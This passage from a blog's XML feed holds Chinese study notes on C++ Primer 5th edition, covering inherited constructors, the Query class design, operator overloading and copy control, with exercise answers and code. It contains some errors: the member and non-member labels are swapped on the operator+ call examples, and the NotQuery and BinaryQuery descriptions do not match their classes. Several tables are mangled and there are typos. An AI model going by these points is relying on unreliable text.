id="继承的构造函数">继承的构造函数</h3><ul><li>C++11新标准中，派生类可以重用其直接基类定义的构造函数。</li><li>通常情况下，<code>using</code>声明语句只是令某个名字在当前作用域内可见。而当作用于构造函数时，<code>using</code>声明语句会令编译器产生代码。<br>如<code>using Disc_quote::Disc_quote;</code>，注明了要继承<code>Disc_quote</code>的构造函数。如果派生类有自己的数据成员，则这些成员将被默认初始化。</li><li>和普通的<code>using</code>声明不一样，构造函数的<code>using</code>声明不会改变该构造函数的访问级别。</li></ul><h2 id="容器与继承">容器与继承</h2><ul><li>派生类<strong>对象</strong>直接赋值给基类对象，其中的派生类部分会被切掉。</li><li>在容器中放置（智能）指针而非对象。</li><li>对于C++面向对象的编程来说，一个悖论是我们无法直接使用对象进行面向对象编程。相反，我们必须使用指针和引用。因为指针会增加程序的复杂性，所以经常定义一些辅助的类来处理这些复杂的情况。</li></ul><h2 id="文本查询程序再探">文本查询程序再探</h2><ul><li>使系统支持：单词查询、逻辑非查询、逻辑或查询、逻辑与查询。</li></ul><h3 id="面向对象的解决方案">面向对象的解决方案</h3><ul><li>将几种不同的查询建模成相互独立的类，这些类共享一个公共基类：<ul><li><code>WordQuery</code></li><li><code>NotQuery</code></li><li><code>OrQuery</code></li><li><code>AndQuery</code></li></ul></li><li>这些类包含两个操作：<ul><li><code>eval</code>：接受一个<code>TextQuery</code>对象并返回一个<code>QueryResult</code>。</li><li><code>rep</code>：返回基础查询的<code>string</code>表示形式。</li></ul></li><li>继承和组合：<ul><li>当我们令一个类公有地继承另一个类时，派生类应当反映与基类的“是一种（Is A）”的关系。</li><li>类型之间另一种常见的关系是“有一个（Has A）”的关系。</li></ul></li><li>对于面向对象编程的新手来说，想要理解一个程序，最困难的部分往往是理解程序的设计思路。一旦掌握了设计思路，接下来的实现也就水到渠成了。</li></ul><p><strong>Query程序设计</strong>:</p><table><thead><tr><th>操作</th><th>解释</th></tr></thead><tbody><tr><td><code>Query</code>程序接口类和操作</td><td></td></tr><tr><td><code>TextQuery</code></td><td>该类读入给定的文件并构建一个查找图。包含一个<code>query</code>操作，它接受一个<code>string</code>实参，返回一个<code>QueryResult</code>对象；该<code>QueryResult</code>对象表示<code>string</code>出现的行。</td></tr><tr><td><code>QueryResult</code></td><td>该类保存一个<code>query</code>操作的结果。</td></tr><tr><td><code>Query</code></td><td>是一个接口类，指向<code>Query_base</code>派生类的对象。</td></tr><tr><td><code>Query q(s)</code></td><td>将<code>Query</code>对象<code>q</code>绑定到一个存放着<code>string s</code>的新<code>WordQuery</code>对象上。</td></tr><tr><td><code>q1 &amp; q2</code></td><td>返回一个<code>Query</code>对象，该<code>Query</code>绑定到一个存放<code>q1</code>和<code>q2</code>的新<code>AndQuery</code>对象上。</td></tr><tr><td>`q1</td><td>q2`</td></tr><tr><td><code>~q</code></td><td>返回一个<code>Query</code>对象，该<code>Query</code>绑定到一个存放<code>q</code>的新<code>NotQuery</code>对象上。</td></tr><tr><td><code>Query</code>程序实现类</td><td></td></tr><tr><td><code>Query_base</code></td><td>查询类的抽象基类</td></tr><tr><td><code>WordQuery</code></td><td><code>Query_base</code>的派生类，用于查找一个给定的单词</td></tr><tr><td><code>NotQuery</code></td><td><code>Query_base</code>的派生类，用于查找一个给定的单词</td></tr><tr><td><code>BinaryQuery</code></td><td><code>Query_base</code>的派生类，查询结果是<code>Query</code>运算对象没有出现的行的集合</td></tr><tr><td><code>OrQuery</code></td><td><code>Query_base</code>的派生类，返回它的两个运算对象分别出现的行的并集</td></tr><tr><td><code>AndQuery</code></td><td><code>Query_base</code>的派生类，返回它的两个运算对象分别出现的行的交集</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
          <category> 《C++ Primer 5th》 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>第14章 重载运算与类型转换</title>
      <link href="/2023/12/04/C-%E3%80%8AC-Primer-5th%E3%80%8B-ch14-%E9%87%8D%E8%BD%BD%E8%BF%90%E7%AE%97%E4%B8%8E%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/"/>
      <url>/2023/12/04/C-%E3%80%8AC-Primer-5th%E3%80%8B-ch14-%E9%87%8D%E8%BD%BD%E8%BF%90%E7%AE%97%E4%B8%8E%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/</url>
      
        <content type="html"><![CDATA[<h2 id="基本概念">基本概念</h2><ul><li>重载运算符是具有特殊名字的函数：由关键字<code>operator</code>和其后要定义的运算符号共同组成。</li><li>除了重载的函数调用运算符<code>()</code>外，其他重载运算符不能含有默认实参。</li><li>当一个重载的运算符是成员函数时，<code>this</code>绑定到左侧运算对象。动态运算符符函数的参数数量比运算对象的数量<strong>少一个</strong>。</li><li>只能重载大多数的运算符，而不能发明新的运算符号。</li><li>重载运算符的优先级和结合律跟对应的内置运算符保持一致。</li><li>调用方式：<ul><li><code>data1 + data2;</code></li><li><code>operator+(data1, data2);</code> 成员</li><li><code>data1.operator+=(data2);</code> 非成员</li></ul></li></ul><p><strong>运算符</strong>:</p><table><thead><tr><th>可以被重载</th><th>不可以被重载</th></tr></thead><tbody><tr><td><code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>, <code>%</code>, <code>^</code></td><td><code>::</code>, <code>.*</code>, <code>.</code>, <code>? :</code>,</td></tr><tr><td><code>&amp;</code>, `</td><td><code>, </code>~`, `!`, `,`, `=`</td></tr><tr><td><code>&lt;</code>, <code>&gt;</code>, <code>&lt;=</code>, <code>&gt;=</code>, <code>++</code>, <code>--</code></td><td></td></tr><tr><td><code>&lt;&lt;</code>, <code>&gt;&gt;</code>, <code>==</code>, <code>!=</code>, <code>&amp;&amp;</code>, `</td><td></td></tr><tr><td><code>+=</code>, <code>-=</code>, <code>/=</code>, <code>%=</code>, <code>^=</code>, <code>&amp;=</code></td><td></td></tr><tr><td>|=, <code>*=</code>, <code>&lt;&lt;=</code>, <code>&gt;&gt;=</code>, <code>[]</code>, <code>()</code></td><td></td></tr><tr><td><code>-&gt;</code>, <code>-&gt;*</code>, <code>new</code>, <code>new[]</code>, <code>delete</code>, <code>delete[]</code></td><td></td></tr></tbody></table><h3 id="某些运算符不应该被重载">某些运算符不应该被重载</h3><blockquote><p>通常不应重载逗号、取地址、逻辑与和逻辑或运算符。</p></blockquote><ul><li>由于使用重载的运算符本质上试一次函数调用，因此这些关于对象求值顺序的规则无法应用到重载的运算符上。因此逻辑与、逻辑或、逗号运算符的运算对象求值顺序规则无法保留下来。除此之外，重载保本也无法保留内置运算符的短路求值属性，因此不建议重载它们。</li><li>一般补充在逗号运算符和取地址运算符，因为C++已经定义了它们用于类类型对象时的特殊含义，所以不应被重载，否则行为异于常态，用户难以适应。</li></ul><h3 id="选择作为成员或者非成员">选择作为成员或者非成员</h3><p><strong>作为成员</strong></p><ul><li><strong>赋值（<code>=</code>）、下标（<code>[]</code>）、调用（<code>()</code>）和成员访问箭头（<code>-&gt;</code>）运算符必须是成员</strong>。</li><li>复合赋值运算符一般来说是成员。</li><li>改变对象状态的运算符或者和给定类型密切相关的运算符通常是成员，如递增、解引用。</li></ul><p><strong>作为非成员</strong></p><ul><li><p><strong>具有对称性的运算符如算术、相等性、关系和位运算符等，通常是非成员函数。</strong><br>如果把运算符定义为成员函数，那么<code>&quot;hi&quot; + s</code> 就会发生错误：*</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">string s = <span class="string">&quot;world&quot;</span>;</span><br><span class="line">string t = s + <span class="string">&quot;!&quot;</span>;  <span class="comment">// 正确</span></span><br><span class="line">string u = <span class="string">&quot;hi&quot;</span> + s; <span class="comment">// 错误</span></span><br></pre></td></tr></table></figure><p>标准库中string的<code>+</code>运算符是定义成普通的非成员函数，第3条语句执行是没有问题的。</p></li><li><p>作为非成员函数的要求：至少一个运算对象时类类型，并且运算对象都能准确无误地转换为实参类型。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[cling]$ std::string s1 = <span class="string">&quot;hi &quot;</span> + <span class="string">&quot;world&quot;</span>;</span><br><span class="line">input_line_4:<span class="number">2</span>:<span class="number">25</span>: error: <span class="function">invalid operands to binary <span class="title">expression</span> <span class="params">(<span class="string">&#x27;const char *&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;const char *&#x27;</span>)</span></span></span><br><span class="line"><span class="function"> std::string s1 </span>= <span class="string">&quot;hi &quot;</span> + <span class="string">&quot;world&quot;</span>;</span><br><span class="line">                  ~~~~~ ^ ~~~~~~~</span><br></pre></td></tr></table></figure></li></ul><h4 id="练习14-1">练习14.1</h4><p>Q: 在什么情况下重载的运算符与内置运算符有所区别？在什么情况下重载的运算符又与内置运算符一样？</p><p>A: 相同点：</p><ul><li>优先级、结合性及操作数的数目都不变</li></ul><p>不同点：</p><ul><li>重载操作符必须具有至少一个class或枚举类型的操作数</li><li>重载操作符不保证操作数的求值顺序，例如对<code>&amp;&amp;</code>和<code>||</code> 的重载版本不在具有”短路求值“的特性，两个操作数都要求值，且不规定操作数的求值顺序。</li></ul><h4 id="练习-14-4">练习 14.4</h4><p>Q: 如何确定下列运算符是否应该是类的成员？</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(a) %</span><br><span class="line">(b) %=</span><br><span class="line">(c) ++</span><br><span class="line">(d) -&gt;</span><br><span class="line">(e) &lt;&lt;</span><br><span class="line">(f) &amp;&amp;</span><br><span class="line">(g) ==</span><br><span class="line">(h) ()</span><br></pre></td></tr></table></figure><p>A:</p><ul><li>(a) 不需要是成员。</li><li>(b) 是成员。</li><li>© 是成员。</li><li>(d) 必须是成员。</li><li>(e) 不需要是成员。</li><li>(f) 不需要是成员。</li><li>(g) 不需要是成员。</li><li>(h) 必须是成员。</li></ul><h2 id="输入和输出运算符">输入和输出运算符</h2><h3 id="重载输出运算符">重载输出运算符&lt;&lt;</h3><ul><li>第一个形参通常是一个<strong>非常量</strong>的<code>ostream</code>对象的引用。非常量是因为向流中写入会改变其状态；而引用是因为我们无法复制一个<code>ostream</code>对象。</li><li><code>operator&lt;&lt;</code> 一般要返回它的<code>ostream</code>形参。</li><li><strong>输入输出运算符必须是非成员函数</strong>。否则，其左侧运算对象将是我们的类的一个对象。<br>IO运算符通常需要读写类的非公有数据成员，因此IO运算符一般被声明为友元。</li><li>输出运算符应主要负责打印对象的内容而非控制格式，输出运算符不应该打印换行符。</li></ul><h3 id="重载输入运算符">重载输入运算符&gt;&gt;</h3><ul><li>第一个形参通常是运算符将要读取的流的引用，第二个形参是将要读取到的（非常量）对象的引用。</li><li><strong>输入运算符必须处理输入可能失败的情况</strong>，而输出运算符不需要。</li><li>当读取发生错误时，输入运算符应负责从错误中恢复。</li></ul><h2 id="算术和关系运算符（-、-、-、-）">算术和关系运算符（+、-、*、/）</h2><ul><li>如果类同时定义了算数运算符和相关的复合赋值运算符，则通常情况下应该使用复合赋值来实现算数运算符。</li></ul><h3 id="相等运算符">相等运算符==</h3><ul><li>对称性：非成员friend函数。</li><li>如果定义了<code>operator==</code>，则这个类也应该定义<code>operator!=</code>。</li><li>相等运算符和不等运算符的一个应该把工作委托给另一个。</li><li>相等运算符应该具有传递性。</li><li>如果某个类在逻辑上有相等性的含义，则该类应该定义<code>operator==</code>，这样做可以使用户更容易使用标准库算法来处理这个类。</li></ul><h4 id="练习14-14">练习14.14</h4><p>Q: 你觉得为什么调用 <code>operator+=</code> 来定义<code>operator+</code> 比其他方法更有效？</p><p>A:  因为用 <code>operator+=</code> 会避免使用一个临时对象，而使得更有效。</p><h3 id="关系运算符">关系运算符</h3><ul><li>如果存在唯一一种逻辑可靠的<code>&lt;</code>定义，则应该考虑为这个类定义<code>&lt;</code>运算符。如果同时还包含<code>==</code>，则当且晋档<code>&lt;</code>的定义和<code>++</code>产生的结果一直时才定义<code>&lt;</code>运算符。</li></ul><h2 id="赋值运算符">赋值运算符=</h2><ul><li>我们可以重载赋值运算符。不论形参的类型是什么，赋值运算符都必须定义为成员函数。</li><li>赋值运算符必须定义成类的成员，复合赋值运算符通常情况下也应该这么做。这两类运算符都应该返回左侧运算对象的引用。</li></ul><h2 id="下标运算符">下标运算符[]</h2><ul><li>下标运算符必须是成员函数。</li><li>一般会定义两个版本：<ul><li>1.返回普通引用。</li><li>2.类的常量成员，并返回常量引用。</li></ul></li></ul><h2 id="递增和递减运算符（-、–）">递增和递减运算符（++、–）</h2><ul><li>定义递增和递减运算符的类应该同时定义前置版本和后置版本。</li><li>通常应该被定义成类的成员。</li><li>为了和内置版本保持一致，前置运算符应该返回递增或递减后对象的引用。</li><li>同样为了和内置版本保持一致，后置运算符应该返回递增或递减前对象的值，而不是引用。</li><li>后置版本接受一个额外的，不被使用的<code>int</code>类型的形参。因为不会用到，所以无需命名。</li></ul><h2 id="成员访问运算符（-、-）">成员访问运算符（*、-&gt;）</h2><ul><li>箭头运算符必须是类的成员。解引用运算符通常也是类的成员，尽管并非必须如此。</li><li>重载的箭头运算符必须返回类的指针或者自定义了箭头运算符的某个类的对象。</li><li>解引用和乘法的区别是一个是一元运算符，一个是二元运算符。</li></ul><h2 id="函数调用运算符">函数调用运算符</h2><ul><li>可以像使用函数一样，调用该类的对象。因为这样对待类同时也能存储状态，所以与普通函数相比更加灵活。</li><li>函数调用运算符必须是成员函数。</li><li>一个类可以定义多个不同版本的调用运算符，相互之间应该在参数数量或类型上有所区别。</li><li>如果累定义了调用运算符，则该类的对象称作<strong>函数对象</strong>。</li></ul><h3 id="lambda是函数对象"><code>lambda</code>是函数对象</h3><ul><li><code>lambda</code>捕获变量：<code>lambda</code>产生的类必须为每个值捕获的变量建立对应的数据成员，同时创建构造函数。</li></ul><h3 id="标准库定义的函数对象">标准库定义的函数对象</h3><p><strong>标准库函数对象</strong>:</p><table><thead><tr><th>算术</th><th>关系</th><th>逻辑</th></tr></thead><tbody><tr><td><code>plus&lt;Type&gt;</code></td><td><code>equal_to&lt;Type&gt;</code></td><td><code>logical_and&lt;Type&gt;</code></td></tr><tr><td><code>minus&lt;Type&gt;</code></td><td><code>not_equal_to&lt;Type&gt;</code></td><td><code>logical_or&lt;Type&gt;</code></td></tr><tr><td><code>multiplies&lt;Type&gt;</code></td><td><code>greater&lt;Type&gt;</code></td><td><code>logical_not&lt;Type&gt;</code></td></tr><tr><td><code>divides&lt;Type&gt;</code></td><td><code>greater_equal&lt;Type&gt;</code></td><td></td></tr><tr><td><code>modulus&lt;Type&gt;</code></td><td><code>less&lt;Type&gt;</code></td><td></td></tr><tr><td><code>negate&lt;Type&gt;</code></td><td><code>less_equal&lt;Type&gt;</code></td><td></td></tr></tbody></table><ul><li>可以在算法中使用标准库函数对象。</li></ul><h3 id="可调用对象与function">可调用对象与function</h3><p><strong>标准库function类型</strong>：</p><table><thead><tr><th>操作</th><th>解释</th></tr></thead><tbody><tr><td><code>function&lt;T&gt; f;</code></td><td><code>f</code>是一个用来存储可调用对象的空<code>function</code>，这些可调用对象的调用形式应该与类型<code>T</code>相同。</td></tr><tr><td><code>function&lt;T&gt; f(nullptr);</code></td><td>显式地构造一个空<code>function</code></td></tr><tr><td><code>function&lt;T&gt; f(obj)</code></td><td>在<code>f</code>中存储可调用对象<code>obj</code>的副本</td></tr><tr><td><code>f</code></td><td>将<code>f</code>作为条件：当<code>f</code>含有一个可调用对象时为真；否则为假。</td></tr><tr><td>定义为<code>function&lt;T&gt;</code>的成员的类型</td><td></td></tr><tr><td><code>result_type</code></td><td>该<code>function</code>类型的可调用对象返回的类型</td></tr><tr><td><code>argument_type</code></td><td>当<code>T</code>有一个或两个实参时定义的类型。如果<code>T</code>只有一个实参，则<code>argument_type</code></td></tr><tr><td><code>first_argument_type</code></td><td>第一个实参的类型</td></tr><tr><td><code>second_argument_type</code></td><td>第二个实参的类型</td></tr></tbody></table><ul><li>例如：声明一个<code>function</code>类型，它可以表示接受两个<code>int</code>，返回一个<code>int</code>的可调用对象。<code>function&lt;int(int, int)&gt;</code></li></ul><h2 id="重载、类型转换、运算符">重载、类型转换、运算符</h2><h3 id="类型转换运算符">类型转换运算符</h3><ul><li>类型转换运算符是类的一种特殊成员函数，它负责将一个类类型的值转换成其他类型。类型转换函数的一般形式如下：<code>operator type() const;</code></li><li>一个类型转换函数必须是类的成员函数；它不能声明返回类型，形参列表也必须为空。类型转换函数通常应该是<code>const</code>。</li><li>避免过度使用类型转换函数。</li><li>C++11引入了显式的类型转换运算符。</li><li>向<code>bool</code>的类型转换通常用在条件部分，因此<code>operator bool</code>一般定义成<code>explicit</code>的。</li></ul><h3 id="避免有二义性的类型转换">避免有二义性的类型转换</h3><ul><li>通常，不要为类第几个亿相同的类型转换，也不要在类中定义两个及以上转换源或转换目标是算术类型的转换。</li><li>在调用重载函数时，如果需要额外的标准类型转换，则该转换的级别只有当所有可行函数都请求同一个用户定义的类型转换时才有用。如果所需的用户定义的类型转换不止一个，则该调用具有二义性。</li></ul><h3 id="函数匹配与重载运算符">函数匹配与重载运算符</h3><ul><li>如果<code>a</code>是一种类型，则表达式<code>a sym b</code>可能是：<ul><li><code>a.operatorsym(b);</code></li><li><code>operatorsym(a,b);</code></li></ul></li><li>如果我们队同一个类既提供了转换目标是算术类型的类型转换，也提供了重载的运算符，则将会遇到重载运算符与内置运算符的二义性问题。</li></ul>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
          <category> 《C++ Primer 5th》 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>第13章 拷贝控制</title>
      <link href="/2023/12/03/C-%E3%80%8AC-Primer-5th%E3%80%8B-ch13-%E6%8B%B7%E8%B4%9D%E6%8E%A7%E5%88%B6/"/>
      <url>/2023/12/03/C-%E3%80%8AC-Primer-5th%E3%80%8B-ch13-%E6%8B%B7%E8%B4%9D%E6%8E%A7%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<p><strong>拷贝控制操作</strong>（copy control）</p><ol><li>拷贝构造函数（copy constructor）</li><li>拷贝赋值运算符（copy-assignment operator）</li><li>移动构造函数（move constructor）</li><li>移动赋值运算符（move-assignement operator）</li><li>析构函数（destructor）</li></ol><p>拷贝和移动构造函数定义了当用同类型的另一个对象<strong>初始化</strong>本对象时做什么，拷贝和移动赋值运算符定义了将一个对象<strong>赋予同类型的另一个对象</strong>时做什么。</p><h2 id="拷贝、赋值和销毁">拷贝、赋值和销毁</h2><h3 id="拷贝构造函数">拷贝构造函数</h3><ul><li><p>如果一个构造函数的第一个参数是<strong>自身类类型的引用，且任何额外参数都有默认值</strong>，则此构造函数是<strong>拷贝构造函数</strong>。</p><blockquote><p>注意：拷贝构造函数的第一个参数必须是一个引用类型，虽然可以定义接受非const引用的拷贝构造函数，但此参数几乎总是一个const引用。</p><p>为什么要引用类型：拷贝构造函数被用来初始化非引用类类型参数（非引用形参采取值复制，复制会调用拷贝构造函数），如果其参数不是引用类型，那么调用永远不会成功——为了调用拷贝构造函数，必须拷贝其实参，但为了拷贝实参，我们又需要调用拷贝构造函数，如此无限循环。</p></blockquote></li><li><p><code>class Foo&#123; public: Foo(const Foo&amp;); &#125;</code></p></li><li><p><strong>合成的拷贝构造函数</strong>（synthesized copy constructor）：会将参数的成员逐个拷贝到正在创建的对象中。<br>与默认构造函数不同，<strong>即使我们定义了其他构造函数，编译器也会为我们合成一个拷贝构造函数。</strong></p></li><li><p>拷贝初始化通常使用拷贝构造函数来完成，但是如果一个类有一个移动构造函数，则<strong>拷贝初始化有时会使用移动构造函数而非拷贝构造函数来完成</strong>。</p></li><li><p><strong>拷贝初始化</strong>：</p><ul><li>将右侧运算对象拷贝到正在创建的对象中，如果需要，还需进行类型转换。</li><li>通常使用拷贝构造函数完成。</li><li><code>string book = &quot;9-99&quot;;</code></li><li>出现场景：<ul><li><p>用 <code>=</code> <strong>定义</strong>变量时。</p></li><li><p>将一个对象作为实参传递给一个非引用类型的形参。</p></li><li><p>从一个返回类型为非引用类型的函数返回一个对象。</p></li><li><p>用花括号列表初始化一个数组中的元素或者一个聚合类中的成员。</p><blockquote><p><strong>“列表初始化”使用拷贝构造函数</strong>；注意“列表初始化”与“初始化列表”的区别。</p><p>扩展：当初始化标准库容器或调用其 <code>insert</code> 和 <code>push</code> 成员时，容器会对其元素进行拷贝初始化，而用 <code>emplace</code> 成员创建的元素都进行直接初始化。</p></blockquote></li></ul></li></ul></li></ul><h4 id="练习13-4">练习13.4</h4><p>Q: 假定 <code>Point</code> 是一个类类型，它有一个<code>public</code>的拷贝构造函数，指出下面程序片段中哪些地方使用了拷贝构造函数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Point global;</span><br><span class="line"><span class="function">Point <span class="title">foo_bar</span><span class="params">(Point arg)</span> <span class="comment">// 1</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Point local = arg, *heap = <span class="keyword">new</span> <span class="built_in">Point</span>(global); <span class="comment">// 2: Point local = arg,  3: Point *heap = new Point(global) </span></span><br><span class="line">*heap = local;  <span class="comment">// 拷贝运算符函数</span></span><br><span class="line">Point pa[<span class="number">4</span>] = &#123; local, *heap &#125;; <span class="comment">// 4, 5</span></span><br><span class="line"><span class="keyword">return</span> *heap;  <span class="comment">// 6</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>A: 上面有6处地方使用了拷贝构造函数。</p><h3 id="拷贝赋值运算符">拷贝赋值运算符</h3><ul><li><strong>重载赋值运算符</strong>：<ul><li>重写一个名为 <code>operator=</code> 的函数.</li><li>通常返回一个<strong>指向其左侧运算对象的引用</strong>。</li><li><code>Foo&amp; operator=(const Foo&amp;);</code></li></ul></li><li><strong>合成拷贝赋值运算符</strong>：<ul><li>将右侧运算对象的<strong>每个非 <code>static</code> 成员</strong>赋予左侧运算对象的对应成员。</li><li>只是浅复制，对于动态分配部分很可能会导致错误。</li></ul></li></ul><h4 id="练习13-6">练习13.6</h4><p>Q: 拷贝赋值运算符是什么？什么时候使用它？合成拷贝赋值运算符完成什么工作？什么时候会生成合成拷贝赋值运算符？</p><p>A: 拷贝赋值运算符是一个名为 <code>operator=</code> 的函数。当赋值运算发生时就会用到它。合成拷贝赋值运算符可以用来禁止该类型对象的赋值（帮你隐式生成的拷贝构造和赋值有可能是 delete，比如有用户定义的移动操作，或有成员是非静态引用）。如果一个类未定义自己的拷贝赋值运算符，编译器会为它生成一个合成拷贝赋值运算符。</p><h3 id="析构函数">析构函数</h3><ul><li><p>释放对象所使用的资源，并销毁对象的非<code>static</code>数据成员。</p></li><li><p>名字由波浪号接类名构成。<strong>没有返回值，也不接受参数</strong>。<br><strong>因此不能被重载，对于一个给定类，只会有唯一一个析构函数</strong>。</p></li><li><p><code>~Foo();</code></p></li><li><p>调用时机：</p><ul><li>变量在离开其作用域时。</li><li>当一个对象被销毁时，其成员被销毁。</li><li>容器被销毁时，其元素被销毁。</li><li>动态分配的对象，当对指向它的指针应用<code>delete</code>运算符时。</li><li>对于临时对象，当创建它的完整表达式结束时。</li></ul></li><li><p><strong>在析构函数中，首先执行函数体，然后销毁成员。成员按初始化顺序的逆序销毁。</strong></p><p>不存在类似初始化列表的东西来控制成员如何销毁，析构部分是隐式的，成员销毁时发生什么完全依赖成员的类型。内置类型没有析构函数，只要释放引用或指针所指向的动态分配对象即可。</p><blockquote><p>认识到<strong>析构函数体自身并不直接销毁成员</strong>是非常重要的。<strong>成员是在析构函数体之后隐含的析构阶段被销毁的。</strong></p></blockquote></li><li><p><strong>合成析构函数</strong>，当一个类未定义自己的析构函数时，编译器会为它定义一个合成析构函数：</p><ul><li>空函数体执行完后，<strong>成员会被自动销毁</strong>。</li><li>对于某些类，合成析构函数被用来阻止该类型的对象被销毁。</li><li>注意：析构函数体本身并不直接销毁成员。</li><li>合成析构函数不会 <code>delete</code>一个指针数据成员，因此，此类需要定义一个析构函数来释放构造函数分配的内存。</li></ul></li></ul><h4 id="练习13-11">练习13.11</h4><p>Q: 为前面练习中的 <code>HasPtr</code> 类添加一个析构函数。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HasPtr</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">HasPtr</span>(<span class="type">const</span> std::string &amp;s = std::<span class="built_in">string</span>()) : <span class="built_in">ps</span>(<span class="keyword">new</span> std::<span class="built_in">string</span>(s)), <span class="built_in">i</span>(<span class="number">0</span>) &#123; &#125;</span><br><span class="line">    <span class="built_in">HasPtr</span>(<span class="type">const</span> HasPtr &amp;hp) : <span class="built_in">ps</span>(<span class="keyword">new</span> std::<span class="built_in">string</span>(*hp.ps)), <span class="built_in">i</span>(hp.i) &#123; &#125;</span><br><span class="line">    HasPtr&amp; <span class="keyword">operator</span>=(<span class="type">const</span> HasPtr &amp;hp) &#123;</span><br><span class="line">        std::string *new_ps = <span class="keyword">new</span> std::<span class="built_in">string</span>(*hp.ps);</span><br><span class="line">        <span class="keyword">delete</span> ps;</span><br><span class="line">        ps = new_ps;</span><br><span class="line">        i = hp.i;</span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ~<span class="built_in">HasPtr</span>() &#123;</span><br><span class="line">        <span class="keyword">delete</span> ps;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    std::string *ps;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="练习13-12">练习13.12</h4><p>Q: 在下面的代码片段中会发生几次析构函数调用？</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">fcn</span><span class="params">(<span class="type">const</span> Sales_data *trans, Sales_data accum)</span> </span>&#123;</span><br><span class="line"><span class="function">Sales_data <span class="title">item1</span><span class="params">(*trans)</span>, <span class="title">item2</span><span class="params">(accum)</span></span>;</span><br><span class="line"><span class="keyword">return</span> item1.<span class="built_in">isbn</span>() != item2.<span class="built_in">isbn</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>A: 三次，分别是 <code>accum</code>、<code>item1</code> 和 <code>item2</code>。</p><h4 id="练习13-13">练习13.13</h4><p>Q: 理解拷贝控制成员和构造函数的一个好方法的定义一个简单的类，为该类定义这些成员，每个成员都打印出自己的名字：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">X</span> &#123;</span><br><span class="line"><span class="built_in">X</span>() &#123;std::cout &lt;&lt; <span class="string">&quot;X()&quot;</span> &lt;&lt; std::endl;&#125;</span><br><span class="line"><span class="built_in">X</span>(<span class="type">const</span> X&amp;) &#123;std::cout &lt;&lt; <span class="string">&quot;X(const X&amp;)&quot;</span> &lt;&lt; std::endl;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>给 <code>X</code> 添加拷贝赋值运算符和析构函数，并编写一个程序以不同的方式使用 <code>X</code> 的对象：将它们作为非引用参数传递；动态分配它们；将它们存放于容器中；诸如此类。观察程序的输出，直到你确认理解了什么时候会使用拷贝控制成员，以及为什么会使用它们。当你观察程序输出时，记住编译器可以略过对拷贝构造函数的调用。</p><p>A:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;initializer_list&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">X</span> &#123;</span><br><span class="line">    <span class="built_in">X</span>() &#123; std::cout 